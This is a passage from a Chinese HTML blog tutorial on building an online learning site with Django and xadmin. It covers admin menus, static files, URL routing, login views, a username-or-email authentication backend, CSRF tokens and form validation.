&#39;url&#39;: self.get_model_url(UserMessage, &#39;changelist&#39;)&#125;,</span><br><span class="line">            )&#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#123;&#39;title&#39;: &#39;系统管理&#39;, &#39;menus&#39;: (</span><br><span class="line">                &#123;&#39;title&#39;: &#39;用户咨询&#39;, &#39;url&#39;: self.get_model_url(UserAsk, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;首页轮播&#39;, &#39;url&#39;: self.get_model_url(Banner, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;用户分组&#39;, &#39;url&#39;: self.get_model_url(Group, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;用户权限&#39;, &#39;url&#39;: self.get_model_url(Permission, &#39;changelist&#39;)&#125;,</span><br><span class="line">                &#123;&#39;title&#39;: &#39;日志记录&#39;, &#39;url&#39;: self.get_model_url(Log, &#39;changelist&#39;)&#125;,</span><br><span class="line">            )&#125;,</span><br><span class="line"></span><br><span class="line">xadmin.site.register(views.CommAdminView, GlobalSetting)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终成型菜单:</p><h3 id="日志记录的使用"><a href="#日志记录的使用" class="headerlink" title="日志记录的使用"></a>日志记录的使用</h3><blockquote><p>日志记录会记录下我们进行过什么操作。</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/157.png" alt="img"></p><p>通过点击动作，进入当时修改的某条信息</p><p>写一个自己遇到的问题 在自定义导航栏的菜单顺序时 找了半天也没在xadmin中找到Group<br>最后从django.contrib.auth.models中成功导入</p><h1 id="完成登录-amp-注册-amp-找回密码-amp-激活-amp-验证码集成"><a href="#完成登录-amp-注册-amp-找回密码-amp-激活-amp-验证码集成" class="headerlink" title="完成登录 &amp; 注册 &amp; 找回密码 &amp; 激活 &amp; 验证码集成"></a><center>完成登录 &amp; 注册 &amp; 找回密码 &amp; 激活 &amp; 验证码集成</center></h1><h2 id="首页和登录页面的配置"><a href="#首页和登录页面的配置" class="headerlink" title="首页和登录页面的配置"></a>首页和登录页面的配置</h2><p>用户访问我们的根目录，我们需要把html文件返回给用户。因此我们第一步把html文件放入template目录。 </p><p>在html中找到首页的html。拷贝到我们的template目录 </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/158.png"></p><h3 id="新建static目录-1"><a href="#新建static目录-1" class="headerlink" title="新建static目录"></a>新建static目录</h3><blockquote><p>用来存放css, js等静态文件</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/159.png"></p><h4 id="配置处理静态文件的url。"><a href="#配置处理静态文件的url。" class="headerlink" title="配置处理静态文件的url。"></a>配置处理静态文件的url。</h4><p>Django2.0.1版本下:</p><p>Mxonline3/urls.py：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from django.views.generic import TemplateView</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    path(&#39;xadmin&#x2F;&#39;, xadmin.site.urls),</span><br><span class="line">    # TemplateView.as_view会将template转换为view</span><br><span class="line">    path(&#39;&#39;, TemplateView.as_view(template_name&#x3D; &quot;index.html&quot;), name&#x3D;  &quot;index&quot;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>Django1.9.8版本下:</p><p>Mxonline2/urls.py：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.views.generic import TemplateView</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    url(r&#39;^xadmin&#x2F;&#39;, xadmin.site.urls),</span><br><span class="line">    url(&#39;^$&#39;, TemplateView.as_view(template_name&#x3D;&quot;index.html&quot;), name&#x3D;&quot;index&quot;)</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>此时运行访问就可以访问到我们的index页面，不过会没有样式。</p><h3 id="设置static文件"><a href="#设置static文件" class="headerlink" title="设置static文件"></a>设置static文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 说明静态文件放在哪个目录</span><br><span class="line"></span><br><span class="line">STATIC_URL &#x3D; &#39;&#x2F;static&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">STATICFILES_DIRS &#x3D; (</span><br><span class="line">    os.path.join(BASE_DIR, &quot;static&quot;)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="修改index页面中前端样式的引用地址"><a href="#修改index页面中前端样式的引用地址" class="headerlink" title="修改index页面中前端样式的引用地址"></a>修改index页面中前端样式的引用地址</h3><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/160.png"></p><p>使用ctrl+f查找出所有<code>../</code>,全部替换为<code>/static/</code></p><p>然后点击运行，刷新页面可以看到我们的页面已经显示正常了。</p><h3 id="拷贝登录页面到template"><a href="#拷贝登录页面到template" class="headerlink" title="拷贝登录页面到template"></a>拷贝登录页面到template</h3><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/161.png" alt="mark"></p><p>使用ctrl+f查找出所有<code>../</code>,全部替换为<code>/static/</code></p><blockquote><p>将css，js，图片全部替换完。</p></blockquote><h4 id="url配置跳转登录页面"><a href="#url配置跳转登录页面" class="headerlink" title="url配置跳转登录页面"></a>url配置跳转登录页面</h4><p>Mxonline2/urls.py：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 登录页面跳转url</span><br><span class="line">url(&#39;^login&#x2F;$&#39;, TemplateView.as_view(template_name&#x3D;&quot;login.html&quot;), name&#x3D;&quot;login&quot;)</span><br></pre></td></tr></table></figure><p>Mxonline3/urls.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># TemplateView.as_view会将template转换为view</span><br><span class="line">path(&#39;&#39;, TemplateView.as_view(template_name&#x3D; &quot;index.html&quot;), name&#x3D;  &quot;index&quot;),</span><br><span class="line">path(&#39;login&#x2F;&#39;, TemplateView.as_view(template_name&#x3D; &quot;login.html&quot;), name&#x3D;  &quot;login&quot;)</span><br></pre></td></tr></table></figure><p>在index页面，ctrl+f找到登录。将a标签中地址替换为login的url。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/162.png" alt="mark"></p><p>取消注释后，将login.html改为<code>/login/</code></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/163.png" alt="mark"></p><p>点击左侧减号收起。然后使用<code>&lt;!--</code>与<code>--&gt;</code>将个人中心暂时注释。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/164.png" alt="mark"></p><p>可以看到登录注册，点击登录。</p><blockquote><p>根路径下的所有url都不需要斜杠</p><p>此时我们的首页已经可以成功显示，通过首页点击登录也可以成功跳转登录页面</p></blockquote><h2 id="用户登录-1"><a href="#用户登录-1" class="headerlink" title="用户登录-1"></a>用户登录-1</h2><p>Django的view实际就是一个函数，接收request请求对象，处理后返回response对象。</p><p>users/views.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"># 当我们配置url被这个view处理时，自动传入request对象.</span><br><span class="line">def login(request):</span><br><span class="line">    # 前端向后端发送的请求方式: get 或post</span><br><span class="line"></span><br><span class="line">    # 登录提交表单为post</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        pass</span><br><span class="line">    # 获取登录页面为get</span><br><span class="line">    elif request.method &#x3D;&#x3D; &quot;GET&quot;:</span><br><span class="line">        # render就是渲染html返回用户</span><br><span class="line">        # render三变量: request 模板名称 一个字典写明传给前端的值</span><br><span class="line">        return render(request, &quot;login.html&quot;, &#123;&#125;)</span><br></pre></td></tr></table></figure><p>django1.9.8/urls.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from users.views import user_login</span><br><span class="line">    # 登录页面跳转url login不要直接调用。而只是指向这个函数对象。</span><br><span class="line">    url(&#39;^login&#x2F;$&#39;,login, name&#x3D;&quot;login&quot;)</span><br></pre></td></tr></table></figure><p>django2.0.1/urls.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from users.views import login</span><br><span class="line">    path(&#39;login&#x2F;&#39;, login, name&#x3D;&quot;login&quot;)</span><br></pre></td></tr></table></figure><p>在两行返回语句的位置打上断点:</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/165.png" alt="mark"></p><p>点击debug，进入首页后点击登录。可以看到</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/166.png" alt="mark"></p><p>说明确实是通过get请求请求页面的。</p><p>通过值浏览器窗口可以看到这是一个<code>&lt;WSGIRequest: GET &#39;/login/&#39;&gt;</code>对象</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/167.png"></p><h2 id="用户登录2"><a href="#用户登录2" class="headerlink" title="用户登录2"></a>用户登录2</h2><h3 id="html-form基础知识"><a href="#html-form基础知识" class="headerlink" title="html form基础知识"></a>html form基础知识</h3><p>templates/login.html:</p><blockquote><p>可以看到form表单中有input。点击提交会把值提交到后台。我们需要修改action让它指向我们的后台相应地址。</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/168.png" alt="mark"></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/169.png" alt="mark"></p><blockquote><p>input中的name值会被传递到后台。回组成键值对形式。</p></blockquote><p>submit类型的input</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/170.png"></p><p>只保留post这里的断点。输入用户名密码。查看debug情况</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/171.png" alt="mark"></p><p><code>403禁止访问</code>错误: html页面内必须加上<code>crsf token</code> 才能传值到后台。</p><blockquote><p>我会随机的给前端发一串符号，你必须把这串符号带回来，我才允许你post。</p></blockquote><p>![</p><p>mark](Django-Xadmin开发在线学习平台/172.png)</p><p>from表单之前写上<code>crsf token</code></p><p>此时我们查看前端页面：</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/173.png"></p><p>可以看到html中登录下面有一个隐藏着的值：crsf token, 不会显示。</p><p>此时点击登录跳转到pass位置。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/174.png" alt="mark"></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/175.png" alt="mark"></p><p>可以看到request中的POST中是一个queryset的对象。我们可以把它当成一个字典来用。<br>来取到前端的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">    # 取不到时为空，username，password为前端页面name值</span><br><span class="line">    user_name &#x3D; request.POST.get(&quot;username&quot;, &quot;&quot;)</span><br><span class="line">    pass_word &#x3D; request.POST.get(&quot;password&quot;, &quot;&quot;)</span><br></pre></td></tr></table></figure><p>取到用户名和密码我们就要开始进行验证登录。使用Django自带的<code>auth</code>方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from django.contrib.auth import authenticate, login</span><br><span class="line"></span><br><span class="line">    # 登录提交表单为post</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">         # 取不到时为空，username，password为前端页面name值</span><br><span class="line">        user_name &#x3D; request.POST.get(&quot;username&quot;, &quot;&quot;)</span><br><span class="line">        pass_word &#x3D; request.POST.get(&quot;password&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">        # 成功返回user对象,失败返回null</span><br><span class="line">        user &#x3D; authenticate(username&#x3D; user_name, password&#x3D; pass_word)</span><br><span class="line"></span><br><span class="line">        # 如果不是null说明验证成功</span><br><span class="line">        if user is not None:</span><br><span class="line">            # login_in 两参数：request, user</span><br><span class="line">            # 实际是对request写了一部分东西进去，然后在render的时候：</span><br><span class="line">            # request是要render回去的。这些信息也就随着返回浏览器。完成登录</span><br><span class="line">            login(request, user)</span><br><span class="line">            # 跳转到首页 user request会被带回到首页</span><br><span class="line">            return render(request, &quot;index.html&quot;)</span><br><span class="line">        # 没有成功说明里面的值是None，并再次跳转回主页面</span><br><span class="line">        else:</span><br><span class="line">            return render(request, &quot;login.html&quot;, &#123;&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>authenticate调用只需要传入用户名和密码。成功会返回user对象，失败返回null </p></blockquote><p>html中通过</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/176.png"></p><blockquote><p>设置成如果登录显示个人中心那段，未登录显示登录注册</p></blockquote><p>打上断点</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/177.png"></p><p>点击debug后可以看到</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/178.png" alt="mark"></p><blockquote><p>我们成功的取到了值。</p></blockquote><p>Django默认我们使用用户名和密码来登录</p><p>成功的登录user值如下</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/179.png" alt="mark"></p><p>但是继续执行报错:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login() takes exactly 1 argument (2 given)</span><br></pre></td></tr></table></figure><p>这时因为我们处理登录的自定义函数也叫login。就直接调用了自身，而不是调用Django提供的login。<strong>所以我们一定不要把自定义view函数命名与Django提供的冲突</strong></p><blockquote><p>解决方案：将我们的login改为<code>def user_login(request):</code></p></blockquote><p>并且前往urls.py中将login也一并改了</p><p>此时运行可以看到我们的个人中心已经出来了。</p><h3 id="改造为使用邮箱用户名均可。Setting中重载变量"><a href="#改造为使用邮箱用户名均可。Setting中重载变量" class="headerlink" title="改造为使用邮箱用户名均可。Setting中重载变量"></a>改造为使用邮箱用户名均可。Setting中重载变量</h3><blockquote><p>自定义authenticate方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from django.contrib.auth.backends import ModelBackend</span><br><span class="line">from .models import UserProfile</span><br><span class="line"># 并集运算</span><br><span class="line">from django.db.models import Q</span><br><span class="line"></span><br><span class="line"># 实现用户名邮箱均可登录</span><br><span class="line"># 继承ModelBackend类，因为它有方法authenticate，可点进源码查看</span><br><span class="line">class CustomBackend(ModelBackend):</span><br><span class="line">    def authenticate(self, username&#x3D;None, password&#x3D;None, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            # 不希望用户存在两个，get只能有一个。两个是get失败的一种原因 Q为使用并集查询</span><br><span class="line"></span><br><span class="line">            user &#x3D; UserProfile.objects.get(Q(username&#x3D;username)|Q(email&#x3D;username))</span><br><span class="line"></span><br><span class="line">            # django的后台中密码加密：所以不能password&#x3D;&#x3D;password</span><br><span class="line">            # UserProfile继承的AbstractUser中有def check_password(self, raw_password):</span><br><span class="line"></span><br><span class="line">            if user.check_password(password):</span><br><span class="line">                return user</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return None</span><br></pre></td></tr></table></figure><p>Mxonline2/settings.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 设置邮箱和用户名均可登录</span><br><span class="line">AUTHENTICATION_BACKENDS &#x3D; (</span><br><span class="line">    &#39;users.views.CustomBackend&#39;,</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/180.png" alt="mark"></p><blockquote><p>使用xadmin的退出，注销当前用户的退出。</p></blockquote><p>此时我们可以通过邮箱和用户名都可以完成登录。</p><h3 id="用户提示：return页面时提供它的错误信息"><a href="#用户提示：return页面时提供它的错误信息" class="headerlink" title="用户提示：return页面时提供它的错误信息"></a>用户提示：return页面时提供它的错误信息</h3><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/181.png%5D" alt="mark"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">return render(request, &quot;login.html&quot;, &#123;&quot;msg&quot;:&quot;用户名或密码错误! &quot;&#125;)</span><br></pre></td></tr></table></figure><p>Html中如何取到这个值;</p><p>login html中这段是用来做错误提示的。</p><p><a href="http://myphoto.mtianyan.cn/blog/180110/3i7BF5edj8.png?imageslim"><img src="http://myphoto.mtianyan.cn/blog/180110/3i7BF5edj8.png?imageslim" alt="mark"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;error btns login-form-tips&quot; id&#x3D;&quot;jsLoginTips&quot;&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>验证：</p><p><a href="http://myphoto.mtianyan.cn/blog/180110/7I9gdJ5DLj.png?imageslim"><img src="http://myphoto.mtianyan.cn/blog/180110/7I9gdJ5DLj.png?imageslim" alt="mark"></a></p><h2 id="用form实现登录-1"><a href="#用form实现登录-1" class="headerlink" title="用form实现登录-1"></a>用form实现登录-1</h2><p>上面我们的用户登录的方法是基于函数来做的。本节我们做一个基于类方法的版本。<br>要求对类的继承有了解。</p><p>基础教程中基本上都是基于函数来做的，其实更推荐基于类来做。基于类可以带来不少好处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 基于类实现需要继承的view</span><br><span class="line">from django.views.generic.base import View</span><br><span class="line">class LoginView(View):</span><br><span class="line">    # 直接调用get方法免去判断</span><br><span class="line">    def get(self, request):</span><br><span class="line">        # render就是渲染html返回用户</span><br><span class="line">        # render三变量: request 模板名称 一个字典写明传给前端的值</span><br><span class="line">        return render(request, &quot;login.html&quot;, &#123;&#125;)</span><br><span class="line">    def post(self, request):</span><br><span class="line">        # 取不到时为空，username，password为前端页面name值</span><br><span class="line">        user_name &#x3D; request.POST.get(&quot;username&quot;, &quot;&quot;)</span><br><span class="line">        pass_word &#x3D; request.POST.get(&quot;password&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">        # 成功返回user对象,失败返回null</span><br><span class="line">        user &#x3D; authenticate(username&#x3D;user_name, password&#x3D;pass_word)</span><br><span class="line"></span><br><span class="line">        # 如果不是null说明验证成功</span><br><span class="line">        if user is not None:</span><br><span class="line">            # login_in 两参数：request, user</span><br><span class="line">            # 实际是对request写了一部分东西进去，然后在render的时候：</span><br><span class="line">            # request是要render回去的。这些信息也就随着返回浏览器。完成登录</span><br><span class="line">            login(request, user)</span><br><span class="line">            # 跳转到首页 user request会被带回到首页</span><br><span class="line">            return render(request, &quot;index.html&quot;)</span><br><span class="line">        # 没有成功说明里面的值是None，并再次跳转回主页面</span><br><span class="line">        else:</span><br><span class="line">            return render(request, &quot;login.html&quot;, &#123;&quot;msg&quot;: &quot;用户名或密码错误! &quot;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-523a287af519d5c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/686" alt="img"></p><p>mark</p><blockquote><p>继承的view中的方法。</p></blockquote><p>django1.9.8 urls中的配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 换用类实现</span><br><span class="line">from users.views import LoginView</span><br><span class="line">    # 基于类方法实现登录,这里是调用它的方法</span><br><span class="line">    url(&#39;^login&#x2F;$&#39;, LoginView.as_view(), name&#x3D;&quot;login&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Django2.0.1 urls配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 基于类方法实现登录,这里是调用它的方法</span><br><span class="line">path(&#39;login&#x2F;&#39;, LoginView.as_view(), name&#x3D;&quot;login&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="form字段验证"><a href="#form字段验证" class="headerlink" title="form字段验证"></a>form字段验证</h2><p>验证最大长度，是否为空等一系列。</p><p>users下新建forms文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"># 引入Django表单</span><br><span class="line">from  django import forms</span><br><span class="line"></span><br><span class="line"># 登录表单验证</span><br><span class="line">class LoginForm(forms.Form):</span><br><span class="line">    # 用户名密码不能为空</span><br><span class="line">    username &#x3D; forms.CharField(required&#x3D;True)</span><br><span class="line">    password &#x3D; forms.CharField(required&#x3D;True, min_length&#x3D;5)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>定义好forms之后我们来使用它做验证。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def post(self, request):</span><br><span class="line">        # 类实例化需要一个字典参数dict:request.POST就是一个QueryDict所以直接传入</span><br><span class="line">        # POST中的usernamepassword，会对应到form中</span><br><span class="line">        login_form &#x3D; LoginForm(request.POST)</span><br><span class="line">        #is_valid判断我们字段是否有错执行我们原有逻辑，验证失败跳回login页面</span><br><span class="line">        if login_form.is_valid():</span><br><span class="line">            # 取不到时为空，username，password为前端页面name值</span><br><span class="line">            user_name &#x3D; request.POST.get(&quot;username&quot;, &quot;&quot;)</span><br><span class="line">            pass_word &#x3D; request.POST.get(&quot;password&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">            # 成功返回user对象,失败返回null</span><br><span class="line">            user &#x3D; authenticate(username&#x3D;user_name, password&#x3D;pass_word)</span><br><span class="line"></span><br><span class="line">            # 如果不是null说明验证成功</span><br><span class="line">            if user is not None:</span><br><span class="line">                # login_in 两参数：request, user</span><br><span class="line">                # 实际是对request写了一部分东西进去，然后在render的时候：</span><br><span class="line">                # request是要render回去的。这些信息也就随着返回浏览器。完成登录</span><br><span class="line">                login(request, user)</span><br><span class="line">                # 跳转到首页 user request会被带回到首页</span><br><span class="line">                return render(request, &quot;index.html&quot;)</span><br><span class="line">        # 验证不成功跳回登录页面</span><br><span class="line">        # 没有成功说明里面的值是None，并再次跳转回主页面</span><br><span class="line">        else:</span><br><span class="line">            return render(request, &quot;login.html&quot;, &#123;&quot;msg&quot;: &quot;用户名或密码错误! &quot;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="完善错误提示"><a href="#完善错误提示" class="headerlink" title="完善错误提示"></a>完善错误提示</h3><p>比如：既然表单都验证失败了，就不用显示密码出错了</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-9d9f75e4719061c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/516" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 